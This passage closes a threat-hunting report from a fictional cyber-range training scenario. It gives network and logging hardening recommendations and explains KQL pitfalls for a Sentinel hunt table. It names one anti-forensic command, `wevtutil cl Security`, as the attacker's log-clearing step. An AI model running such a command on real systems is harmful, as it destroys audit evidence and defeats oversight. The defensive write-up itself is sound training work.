10. **Network segmentation:** Engineering workstations should not be able to initiate SMB or WMI traffic to Domain Controllers. The path `WS-ENG04 → SRV-DC01:445` should be firewall-blocked.
11. **SMB outbound filtering:** Block outbound SMB/445 from workstations to internal servers except for explicitly defined paths (file shares to designated file servers only).
12. **Enable `Audit Process Creation` with command-line logging** (`Include command line in process creation events` GPO) on every host. This is what made the entire reconstruction possible in this dataset.
13. **Enable Sysmon enterprise-wide** with a maintained config (e.g., the SwiftOnSecurity baseline). Sysmon was the silver bullet that survived `wevtutil cl Security`.
14. **Enforce Tamper Protection on Defender** to prevent attackers disabling realtime scanning during the dwell-time window.

---

## Key Investigative Lesson — `EventTime` vs `TimeGenerated`

The `SilentCorridorX_CL` table's `TimeGenerated` field is the Sentinel ingestion timestamp, set when the platform replays the curated dataset into the workspace. **All 8,538 events have `TimeGenerated` values clustered in a narrow ingestion window** — using it for sequencing produces nonsensical results (everything appears to happen within minutes of each other).

The actual event time lives in the `EventTime` string column. Critical caveats:

1. **`EventTime` is a `string`, not a `datetime`.** Sorting works (`| sort by EventTime asc`). Arithmetic does NOT work directly — wrap with `todatetime(EventTime)` for any time math.
2. **Always start every query with the `let HuntData = ...` base filter** to exclude test ingestion noise:
   ```kql
   let HuntData = SilentCorridorX_CL
   | where isnotempty(EventTime)
   | where TimeGenerated > datetime(2026-04-07T14:00:00Z);
   ```
3. **Some columns are blank for some MdeTable values.** `RegistryKey` is populated only for `DeviceRegistryEvents`; `ProcessCommandLine` only for `DeviceProcessEvents`/`DeviceEvents`; etc. Always run `| where MdeTable == "X" | take 1` first to see what's populated for each source.
4. **`DeviceFileEvents.AccountName` is often blank** — files are written under SYSTEM context. To attribute a file write to a user, pivot to `DeviceProcessEvents` on the same host at the same `EventTime`.
5. **`DeviceNetworkEvents` is direction-biased per host.** Outbound from host A appears on host A's records; inbound to host B appears on host B's records. To find who reached a given host, query the target's events and filter by `RemoteIP` as the source.

These five rules together are 90% of the productive query speed in this dataset. Internalize them and the schema-onboarding tax for future hunts on the same platform drops from 30+ minutes to under 5.

---

*Report generated 2026-05-09 by Rich Vincent (`d3tr0it_z3r0`). Hunt data source: `SilentCorridorX_CL` (`LAW-SilentCorridor` workspace, 8,538 rows, investigation window 20 Feb — 5 Mar 2026). All in-dataset entities (Haldric Aerospace, GREY VEIL, employee accounts, credentials) are fictional and exist only within the LOG(N) Pacific Cyber Range training scenario.*
